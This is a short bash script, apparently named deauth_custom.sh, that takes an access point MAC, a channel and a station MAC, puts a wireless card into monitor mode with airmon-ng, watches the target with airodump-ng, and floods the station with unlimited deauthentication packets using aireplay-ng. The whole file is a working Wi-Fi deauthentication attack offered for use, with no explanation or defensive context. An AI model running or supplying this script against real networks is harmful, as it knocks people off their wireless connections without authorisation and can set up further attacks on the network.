echo "Usage: sudo ./deauth_custom.sh <ap mac> <channel> <station mac>"



airmon-ng check kill
airmon-ng start wlan0
xterm -e airodump-ng -d $1 -c $2 wlan0mon&
xterm -e aireplay-ng -0 0 -a $1 -c $3 wlan0mon
airmon-ng stop wlan0mon
systemctl start NetworkManager
